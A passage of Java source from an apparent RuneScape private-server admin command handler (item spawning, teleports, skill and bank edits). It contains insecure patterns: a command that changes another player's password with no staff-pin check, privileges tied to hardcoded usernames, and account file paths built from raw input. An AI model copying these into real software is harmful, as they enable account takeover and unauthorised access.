						Player target11 = (Player) SerializableFilesManager.loadSerializedFile(acc);
						if (target11 == null) {
							continue;
						}
						for (int itemId : itemIds) {
							target11.getEquipment().deleteItem(itemId, Integer.MAX_VALUE);
						}
						SerializableFilesManager.storeSerializableClass(target11, acc);
					} catch (Throwable e) {
						e.printStackTrace();
						player.getPackets().sendMessage(99, "failed: " + acc.getName()+", "+e, player);
					}
				}
				for (Player players : World.getPlayers()) {
					if (players == null)
						continue;
					for (int itemId : itemIds) {
						players.getEquipment().deleteItem(itemId, Integer.MAX_VALUE);
					}
				}
				return true;
				
			case "goblinraid":
				if (!(player.getRights() == 2)) {
					player.getDialogueManager()
					.startDialogue("SimpleMessage",
							"You need to be a adminstrator to start Goblin Raids manually.");
					return true;
				}
				World.sendWorldMessage("<img=7><col=FF0000>News: Goblins have raided Edgeville!", false);
				World.spawnNPC(3264, new WorldTile(3695, 2967, 0), -1, true, true); 
				World.spawnNPC(3264, new WorldTile(3696, 2963, 0), -1, true, true);
				World.spawnNPC(3264, new WorldTile(3692, 2968, 0), -1, true, true);
				World.spawnNPC(3264, new WorldTile(3692, 2965, 0), -1, true, true);
				return true;
				
			case "restartfp":
				FightPits.endGame();
				player.getPackets().sendGameMessage("Fight pits restarted!");
				return true;
			case "modelid":
				int id = Integer.parseInt(cmd[1]);
				player.getPackets().sendMessage(99, 
						"Model id for item " + id + " is: " + ItemDefinitions.getItemDefinitions(id).modelId, player);
				return true;

			case "teletome":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (Wilderness.isAtWild(player) || Wilderness.isAtWild(target) || player.isInDung() || target.isInDung()) {
					player.sm("Nice try");
					return true;
				}
				if(target == null)
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				else
					target.setNextWorldTile(player);
				}
				return true; 
			case "pos":
				try {
					File file = new File("data/positions.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write("|| player.getX() == " + player.getX()
							+ " && player.getY() == " + player.getY() + "");
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true; 

			case "agilitytest":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				player.getControlerManager().startControler("BrimhavenAgility");
				return true; 

			case "partyroom":
				player.getInterfaceManager().sendInterface(647);
				player.getInterfaceManager().sendInventoryInterface(336);
				player.getPackets().sendInterSetItemsOptionsScript(336, 0, 93, 4, 7,
						"Deposit", "Deposit-5", "Deposit-10", "Deposit-All", "Deposit-X");
				player.getPackets().sendIComponentSettings(336, 0, 0, 27, 1278);
				player.getPackets().sendInterSetItemsOptionsScript(336, 30, 90, 4, 7, "Value");
				player.getPackets().sendIComponentSettings(647, 30, 0, 27, 1150);
				player.getPackets().sendInterSetItemsOptionsScript(647, 33, 90, true, 4, 7, "Examine");
				player.getPackets().sendIComponentSettings(647, 33, 0, 27, 1026);   
				ItemsContainer<Item> store = new ItemsContainer<>(215, false);
				for(int i = 0; i < store.getSize(); i++) {
					store.add(new Item(1048, i));
				}
				player.getPackets().sendItems(529, true, store); //.sendItems(-1, -2, 529, store);

				ItemsContainer<Item> drop = new ItemsContainer<>(215, false);
				for(int i = 0; i < drop.getSize(); i++) {
					drop.add(new Item(1048, i));
				}
				player.getPackets().sendItems(91, true, drop);//sendItems(-1, -2, 91, drop);

				ItemsContainer<Item> deposit = new ItemsContainer<>(8, false);
				for(int i = 0; i < deposit.getSize(); i++) {
					deposit.add(new Item(1048, i));
				}
				player.getPackets().sendItems(92, true, deposit);//sendItems(-1, -2, 92, deposit);
				return true; 

			case "objectname":
				name = cmd[1].replaceAll("_", " ");
				String option = cmd.length > 2 ? cmd[2] : null;
				List<Integer> loaded = new ArrayList<Integer>();
				for (int x = 0; x < 12000; x += 2) {
					for (int y = 0; y < 12000; y += 2) {
						int regionId = y | (x << 8);
						if (!loaded.contains(regionId)) {
							loaded.add(regionId);
							r = World.getRegion(regionId, false);
							r.loadRegionMap();
							List<WorldObject> list = r.getObjects();
							if (list == null) {
								continue;
							}
							for (WorldObject o : list) {
								if (o.getDefinitions().name
										.equalsIgnoreCase(name)
										&& (option == null || o
										.getDefinitions()
										.containsOption(option))) {
									System.out.println("Object found - [id="
											+ o.getId() + ", x=" + o.getX()
											+ ", y=" + o.getY() + "]");
									// player.getPackets().sendGameMessage("Object found - [id="
									// + o.getId() + ", x=" + o.getX() + ", y="
									// + o.getY() + "]");
								}
							}
						}
					}
				}
				/*
				 * Object found - [id=28139, x=2729, y=5509] Object found -
				 * [id=38695, x=2889, y=5513] Object found - [id=38695, x=2931,
				 * y=5559] Object found - [id=38694, x=2891, y=5639] Object
				 * found - [id=38694, x=2929, y=5687] Object found - [id=38696,
				 * x=2882, y=5898] Object found - [id=38696, x=2882, y=5942]
				 */
				// player.getPackets().sendGameMessage("Done!");
				System.out.println("Done!");
				return true;

			case "bork":
				if (Bork.deadTime > System.currentTimeMillis()) {
					player.getPackets().sendGameMessage(Bork.convertToTime());
					return true;
				}
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				player.getControlerManager().startControler("BorkControler", 0,
						null);
				return true; 

			case "killnpc":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				for (NPC n : World.getNPCs()) {
					if (n == null || n.getId() != Integer.parseInt(cmd[1]))
						continue;
					n.sendDeath(n);
				}
				}
				return true; 
			case "sound":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::sound soundid effecttype");
					return true;
				}
				try {
					player.getPackets().sendSound(Integer.valueOf(cmd[1]), 0,
							cmd.length > 2 ? Integer.valueOf(cmd[2]) : 1);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::sound soundid");
				}
				return true; 

			case "music":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::sound soundid effecttype");
					return true;
				}
				try {
					player.getPackets().sendMusic(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::sound soundid");
				}
				return true; 

			case "emusic":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::emusic soundid effecttype");
					return true;
				}
				try {
					player.getPackets()
					.sendMusicEffect(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::emusic soundid");
				}
				return true; 
			case "testdialogue":
				player.getDialogueManager().startDialogue("DagonHai", 7137,
						player, Integer.parseInt(cmd[1]));
				return true; 

			case "removenpcs":
				for (NPC n : World.getNPCs()) {
					if (n.getId() == Integer.parseInt(cmd[1])) {
						n.reset();
						n.finish();
					}
				}
				return true; 
			case "resetkdr":
				player.setKillCount(0);
				player.setDeathCount(0);
				return true; 

			case "removecontroler":
				player.getControlerManager().forceStop();
				player.getInterfaceManager().sendInterfaces();
				return true; 


				

				
			case "removeitemfrombank":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
			    if (cmd.length == 3 || cmd.length == 4)  {
			     Player p = World.getPlayerByDisplayName(Utils.formatPlayerNameForDisplay(cmd[1]));
			     int amount = 1;
			     if (cmd.length == 4) {
			      try {
			       amount = Integer.parseInt(cmd[3]);
			      } catch (NumberFormatException e) {
			       amount = 1;
			      }
			     }
			     if (p != null) {
			      try {
			       Item itemRemoved = new Item(Integer.parseInt(cmd[2]),amount);
			       boolean multiple = itemRemoved.getAmount()  > 1;	              
			        p.getBank().removeItem(itemRemoved.getId());          
			       p.getPackets().sendGameMessage(player.getDisplayName()+" has removed "+(multiple ? itemRemoved.getAmount() : "")
			         + " "+itemRemoved.getDefinitions().getName()+(multiple ? "s" : ""));
			       player.getPackets().sendGameMessage("You have removed "+(multiple ? itemRemoved.getAmount() : "")
			         + " "+itemRemoved.getDefinitions().getName()+(multiple ? "s" : "")+ " from "+p.getDisplayName());
			       return true;
			      } catch (NumberFormatException e) {
			      }
			     }     
			    }
			    player.getPackets().sendGameMessage(
			      "Use: ::"
			      + "itemfrombank player id (optional:amount)");
				}
			    return true;
			    
			case "removeitemfrominv":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
			    if (cmd.length == 3 || cmd.length == 4)  {
			     Player p = World.getPlayerByDisplayName(Utils.formatPlayerNameForDisplay(cmd[1]));
			     int amount = 1;
			     if (cmd.length == 4) {
			      try {
			       amount = Integer.parseInt(cmd[3]);
			      } catch (NumberFormatException e) {
			       amount = 1;
			      }
			     }
			     if (p != null) {
			      try {
			       Item itemDeleted = new Item(Integer.parseInt(cmd[2]),amount);
			       boolean multiple = itemDeleted.getAmount()  > 1;	              
			        p.getInventory().deleteItem(itemDeleted);          
			       p.getPackets().sendGameMessage(player.getDisplayName()+" has removed "+(multiple ? itemDeleted.getAmount() : "")
			         + " "+itemDeleted.getDefinitions().getName()+(multiple ? "s" : ""));
			       player.getPackets().sendGameMessage("You have removed "+(multiple ? itemDeleted.getAmount() : "")
			         + " "+itemDeleted.getDefinitions().getName()+(multiple ? "s" : "")+ " from "+p.getDisplayName());
			       return true;
			      } catch (NumberFormatException e) {
			      }
			     }     
			    }
			    player.getPackets().sendGameMessage(
			      "Use: ::removeitemfrominv player id (optional:amount)");
				}
			    return true;
			    
			case "objectn": 
				if (player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("") || (player.getUsername().equalsIgnoreCase("reddragon") || (player.getUsername().equalsIgnoreCase("")))) {
					if (!player.canSpawn()) {
						player.getPackets().sendGameMessage(
								"You can't spawn while you're in this area.");
						return true;
					}
					StringBuilder sb = new StringBuilder(cmd[1]);
					int amount = 1;
					if (cmd.length > 2) {
						for (int i = 2; i < cmd.length; i++) {
							if (cmd[i].startsWith("+")) {
								amount = Integer.parseInt(cmd[i].replace("+", ""));
							} else {
								sb.append(" ").append(cmd[i]);
							}
						}
					}
					String name1 = sb.toString().toLowerCase().replace("[", "(")
							.replace("]", ")").replaceAll(",", "'");
					for (int i = 0; i < Utils.getObjectDefinitionsSize(); i++) {
						ObjectDefinitions def = ObjectDefinitions
								.getObjectDefinitions(i);
						if (def.getName().toLowerCase().contains(name1)) {
							player.stopAll();
							player.getPackets().sendGameMessage("Found object " + name1 + " - id: " + i + ".");
						}
					}
					player.getPackets().sendGameMessage(
							"Could not find item by the name " + name1 + ".");
				}
				return true; 
			case "itemn": 
				if (player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("") || (player.getUsername().equalsIgnoreCase("reddragon") || (player.getUsername().equalsIgnoreCase("")))) {
					if (!player.canSpawn()) {
						player.getPackets().sendGameMessage(
								"You can't spawn while you're in this area.");
						return true;
					}
					StringBuilder sb = new StringBuilder(cmd[1]);
					int amount = 1;
					if (cmd.length > 2) {
						for (int i = 2; i < cmd.length; i++) {
							if (cmd[i].startsWith("+")) {
								amount = Integer.parseInt(cmd[i].replace("+", ""));
							} else {
								sb.append(" ").append(cmd[i]);
							}
						}
					}
					String name1 = sb.toString().toLowerCase().replace("[", "(")
							.replace("]", ")").replaceAll(",", "'");
					for (int i = 0; i < Utils.getItemDefinitionsSize(); i++) {
						ItemDefinitions def = ItemDefinitions
								.getItemDefinitions(i);
						if (def.getName().toLowerCase().equalsIgnoreCase(name1)) {
							player.getInventory().addItem(i, amount);
							player.stopAll();
							player.getPackets().sendGameMessage("Found item " + name1 + " - id: " + i + ".");
						}
					}
					player.getPackets().sendGameMessage(
							"Could not find item by the name " + name1 + ".");
				}
				return true; 
			    
			case "emptybankother": //created by Anthony fix this.
				//Nice way to steal credits.
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
			    name = "";
			    for (int i = 1; i < cmd.length; i++)
			     name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			    target = World.getPlayerByDisplayName(name);
			     // for (int skill = 9; skill < 9; skill--)
			      target.getBank().collapse(0);
			      
			    try {
			     target.getBank().collapse(0);
			       
			    } catch (NumberFormatException e) {
			     player.getPackets().sendPanelBoxMessage(
			       "Use: ::emptybankother name");
			    }
				}
			    return true;

			case "testbar":
					player.BlueMoonInn = 1;
					player.BlurberrysBar = 1;
					player.DeadMansChest = 1;
					player.DragonInn = 1;
					player.FlyingHorseInn = 1;
					player.ForestersArms = 1;
					player.JollyBoarInn = 1;
					player.KaramjaSpiritsBar = 1;
					player.RisingSun = 1;
					player.RustyAnchor = 1;
					
					player.getPackets().sendGameMessage("You have completed the BarCrawl Minigame!");
				return true;
			    
			case "resetbar":
				player.BlueMoonInn = 0;
				player.BlurberrysBar = 0;
				player.DeadMansChest = 0;
				player.DragonInn = 0;
				player.FlyingHorseInn = 0;
				player.ForestersArms = 0;
				player.JollyBoarInn = 0;
				player.KaramjaSpiritsBar = 0;
				player.RisingSun = 0;
				player.RustyAnchor = 0;
				player.barCrawl = 0;
				player.barCrawlCompleted = false;
				player.getPackets().sendGameMessage("You have reset your BarCrawl Progress.");
			return true;
				
			case "item":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage(
							"Use: ::item id (optional:amount)");
					return true;
				}
				try {
					int itemId = Integer.valueOf(cmd[1]);
					player.getInventory().addItem(itemId,
							cmd.length >= 3 ? Integer.valueOf(cmd[2]) : 1);
					player.stopAll();
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage(
							"Use: ::item id (optional:amount)");
				}
				}
				return true;
				
			case "pickup":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (!player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("")) {
					return true;
				}
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage(
							"Use: ::pickup id (optional:amount)");
					return true;
				}
				try {
					int itemId = Integer.valueOf(cmd[1]);
					player.getInventory().addItem(itemId,
							cmd.length >= 3 ? Integer.valueOf(cmd[2]) : 1);
					player.stopAll();
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage(
							"Use: ::pickup id (optional:amount)");
				}
				}
				return true;

				
			case "testp":
				//PartyRoom.startParty(player);
				return true;
				

			case "god":
				if ( !player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("sirdmeonic") ) {
					return true;
				}
				player.setHitpoints(Short.MAX_VALUE);
				player.setPrayerDelay(Short.MAX_VALUE);
				if (player.getUsername().equalsIgnoreCase("discardedx2"))
					player.sendMessage("Go fuck youself :) from Nosz");
				return true;

			case "prayertest":
				player.setPrayerDelay(4000);
				return true; 

			case "karamja":
				player.getDialogueManager().startDialogue(
						"KaramjaTrip",
						Utils.getRandom(1) == 0 ? 11701
								: (Utils.getRandom(1) == 0 ? 11702 : 11703));
				return true;

			case "shop":
				ShopsHandler.openShop(player, Integer.parseInt(cmd[1]));
				return true; 

			case "clanwars":
				// player.setClanWars(new ClanWars(player, player));
				// player.getClanWars().setWhiteTeam(true);
				// ClanChallengeInterface.openInterface(player);
				return true; 

			case "testdung":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				new DungeonPartyManager(player);
				player.getControlerManager().startControler("DungeonControler");
				return true; 
				
			case "resetother":// Made by Anthony
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
					for (int skill = 0; skill < 25; skill++)
						target.getSkills().setXp(skill, 0);
					target.getSkills().init();
				}
				return true;

			case "checkdisplay":
				for (Player p : World.getPlayers()) {
					if (p == null)
						continue;
					String[] invalids = { "<img", "<img=", "col", "<col=",
							"<shad", "<shad=", "<str>", "<u>" };
					for (String s : invalids)
						if (p.getDisplayName().contains(s)) {
							player.getPackets().sendGameMessage(
									Utils.formatPlayerNameForDisplay(p
											.getUsername()));
						} else {
							player.getPackets().sendGameMessage("None exist!");
						}
				}
				return true; 

			case "removedisplay":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setDisplayName(Utils.formatPlayerNameForDisplay(target.getUsername()));
					target.getPackets().sendGameMessage(
							"Your display name was removed by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have removed display name of "+target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setDisplayName(Utils.formatPlayerNameForDisplay(target.getUsername()));
					player.getPackets().sendGameMessage(
							"You have removed display name of "+target.getDisplayName()+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
			case "cutscene":
				player.getPackets().sendCutscene(Integer.parseInt(cmd[1]));
				return true; 
				
			case "penguin":
				SinkHoles.startEvent();
				return true; 
				
			case "coords":
				player.getPackets().sendPanelBoxMessage(
						"Coords: " + player.getX() + ", " + player.getY()
						+ ", " + player.getPlane() + ", regionId: "
						+ player.getRegionId() + ", rx: "
						+ player.getChunkX() + ", ry: "
						+ player.getChunkY());
				return true; 
			case "mypos":
				player.getPackets().sendPanelBoxMessage(
						"Coords: " + player.getX() + ", " + player.getY()
						+ ", " + player.getPlane() + ", regionId: "
						+ player.getRegionId() + ", rx: "
						+ player.getChunkX() + ", ry: "
						+ player.getChunkY());
				return true; 
				
			case "copy":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player p2 = World.getPlayerByDisplayName(name);
				if (p2 == null) {
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
					return true;
				}
				}
							

			case "itemoni":
				player.getPackets().sendItemOnIComponent(Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]),
						Integer.valueOf(cmd[3]), 1);
				return true; 

			case "trade":

				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				target = World.getPlayerByDisplayName(name);
				if (target != null) {
					player.getTrade().openTrade(target);
					target.getTrade().openTrade(player);
				}
				return true;

			case "setlevel":
				if (player.isPker) {
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (cmd.length < 3) {
					player.getPackets().sendGameMessage(
							"Usage ::setlevel skillId level");
					return true;
				}
				try {
					int skill = Integer.parseInt(cmd[1]);
					int level = Integer.parseInt(cmd[2]);
					if (level < 0 || level > 99) {
						player.getPackets().sendGameMessage(
								"Please choose a valid level.");
						return true;
					}
					player.getSkills().set(skill, level);
					player.getSkills()
					.setXp(skill, Skills.getXPForLevel(level));
					player.getAppearence().generateAppearenceData();
					return true;
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage(
							"Usage ::setlevel skillId level");
				}
				}
				}
				return true; 

			case "npc":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				try {
					World.spawnNPC(Integer.parseInt(cmd[1]), player, -1, true, true);
					BufferedWriter bw = new BufferedWriter(new FileWriter(
							"./data/npcs/spawns.txt", true));
					bw.write("//" + NPCDefinitions.getNPCDefinitions(Integer.parseInt(cmd[1])).name + " spawned by "+ player.getUsername());
					bw.newLine();
					bw.write(Integer.parseInt(cmd[1])+" - " + player.getX() + " " + player.getY() + " " + player.getPlane());
					bw.flush();
					bw.newLine();
					bw.close();
				} catch (Throwable t) {
					t.printStackTrace();
				}
				}
				return true;

			case "loadwalls":
				WallHandler.loadWall(player.getCurrentFriendChat()
						.getClanWars());
				return true; 

			case "cwbase":
				ClanWars cw = player.getCurrentFriendChat().getClanWars();
				WorldTile base = cw.getBaseLocation();
				player.getPackets().sendGameMessage(
						"Base x=" + base.getX() + ", base y=" + base.getY());
				base = cw.getBaseLocation()
						.transform(
								cw.getAreaType().getNorthEastTile().getX()
								- cw.getAreaType().getSouthWestTile()
								.getX(),
								cw.getAreaType().getNorthEastTile().getY()
								- cw.getAreaType().getSouthWestTile()
								.getY(), 0);
				player.getPackets()
				.sendGameMessage(
						"Offset x=" + base.getX() + ", offset y="
								+ base.getY());
				return true; 

			case "object":
				try {
					int rotation = cmd.length > 2 ? Integer.parseInt(cmd[2]) : 0;
					World.spawnObject(
							new WorldObject(Integer.valueOf(cmd[1]), 10, rotation,player.getX(), player.getY(), player.getPlane()), true);
					BufferedWriter bw = new BufferedWriter(new FileWriter(
							"./data/map/spawns.txt", true));
					bw.write("//Spawned by "+ player.getUsername() +"");
					bw.newLine();
					bw.write(Integer.parseInt(cmd[1])+" 10 "+rotation+" - " + player.getX() + " " + player.getY() + " " + player.getPlane() +" true");
					bw.flush();
					bw.newLine();
					bw.close();
				} catch (Throwable t) {
					t.printStackTrace();
				}
				return true; 

			case "tab":
				try {
					player.getInterfaceManager().sendTab(
							Integer.valueOf(cmd[2]), Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets()
					.sendPanelBoxMessage("Use: tab id inter");
				}
				return true; 

			case "killme":
				player.applyHit(new Hit(player, player.getHitpoints(), HitLook.REGULAR_DAMAGE));
				return true;
				
			case"1hp":
				player.applyHit(new Hit(player, 989, HitLook.REGULAR_DAMAGE));
				return true;
				
			case "phatset":
				if (player.getInventory().getFreeSlots() < 6 && player.getUsername().equalsIgnoreCase("")) {
					player.getPackets().sendGameMessage("You don't have enough space in your inventory.");
					return true;
				}
				for (int i = 1038; i <= 1050; i += 2) {
					player.getInventory().addItem(i, 1);
				}
				return true;
				
			case "setleveloplayer":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username144 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other1 = World.getPlayer(username144);
				if (other1 != null) {
					int skill = Integer.parseInt(cmd[2]);
					int level = Integer.parseInt(cmd[3]);
					other1.getSkills().set(Integer.parseInt(cmd[2]),
					Integer.parseInt(cmd[3]));
					other1.getSkills().set(skill,  level);
					other1.getSkills().setXp(skill, Skills.getXPForLevel(level));
					other1.getPackets().sendGameMessage("One of your skills: "
							+ other1.getSkills().getLevel(skill)
							+ " has been set to " + level + " from "
							+ player.getDisplayName() + ".");
					player.getPackets().sendGameMessage("You have set the skill: "
							+ other1.getSkills().getLevel(skill) + " to "
							+ level
							+ " for " + other1.getDisplayName() + ".");
				}
				}
				return true;
			case "setcombatstatso":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username144 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other1 = World.getPlayer(username144);
				if (other1 != null) {
					int skill = Integer.parseInt(cmd[2]);
					int level = Integer.parseInt(cmd[3]);
					other1.getSkills().set(Integer.parseInt(cmd[2]),
					Integer.parseInt(cmd[3]));
					other1.getSkills().set(skill,  level);
					other1.getSkills().setXp(skill, Skills.getXPForLevel(level));
					other1.getPackets().sendGameMessage("One of your skills: "+ other1.getSkills().getLevel(skill)+ " has been set to " + level + " from "+ player.getDisplayName() + ".");
					player.getPackets().sendGameMessage("You have set the skill: "+ other1.getSkills().getLevel(skill) + " to "+ level+ " for " + other1.getDisplayName() + ".");
				}
				}
				return true;			
			case "allvote":
				for (Player players : World.getPlayers()) {
							if (players == null)
								continue;
					players.getPackets().sendOpenURL("http://noszscape.org/vote/");
					players.getPackets().sendGameMessage("Vote! Vote Vote! ");
						}
	                                                                        return true;
	                                                                        
			case "latestupdate":
				for (Player players : World.getPlayers()) {
							if (players == null)
								continue;
					players.getPackets().sendOpenURL("http://noszscape.org/forumdisplay.php?2-News");
					players.getPackets().sendGameMessage("Check out our latest update just added and post feedback!");
						}
	                                                                        return true;

	                                                                        
	                                                                        
			case "changepassother":
				name = cmd[1];
				File acc1 = new File("data/characters/"
						+ name.replace(" ", "_") + ".p");
				target = null;
				if (target == null) {
					try {
						target = (Player) SerializableFilesManager
								.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
				}
				target.setPassword(cmd[2]);
				player.getPackets().sendGameMessage(
						"You changed their password!");
				try {
					SerializableFilesManager.storeSerializableClass(target,
							acc1);
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;

			case "hidec":
				if (cmd.length < 4) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::hidec interfaceid componentId hidden");
					return true;
				}
				try {
					player.getPackets().sendHideIComponent(
							Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]),
							Boolean.valueOf(cmd[3]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::hidec interfaceid componentId hidden");
				}
				return true; 

			case "string":
				try {
					player.getInterfaceManager().sendInterface(Integer.valueOf(cmd[1]));
					for (int i = 0; i <= Integer.valueOf(cmd[2]); i++)
						player.getPackets().sendIComponentText(Integer.valueOf(cmd[1]), i,
								"child: " + i);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: string inter childid");
				}
				return true; 

			case "istringl":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}

				try {
					for (int i = 0; i < Integer.valueOf(cmd[1]); i++) {
						player.getPackets().sendGlobalString(i, "String " + i);
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 

			case "istring":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					player.getPackets().sendGlobalString(
							Integer.valueOf(cmd[1]),
							"String " + Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: String id value");
				}
				return true; 

			case "iconfig":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					for (int i = 0; i < Integer.valueOf(cmd[1]); i++) {
						player.getPackets().sendGlobalConfig(Integer.parseInt(cmd[2]), i);
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 

			case "config":
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					player.getPackets().sendConfig(Integer.valueOf(cmd[1]),
							Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 
			case "forcemovement":
				WorldTile toTile = player.transform(0, 5, 0);
				player.setNextForceMovement(new ForceMovement(
						new WorldTile(player), 1, toTile, 2,  ForceMovement.NORTH));

				return true;
			case "configf":
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					player.getPackets().sendConfigByFile(
							Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 

			case "hit":
				for (int i = 0; i < 5; i++)
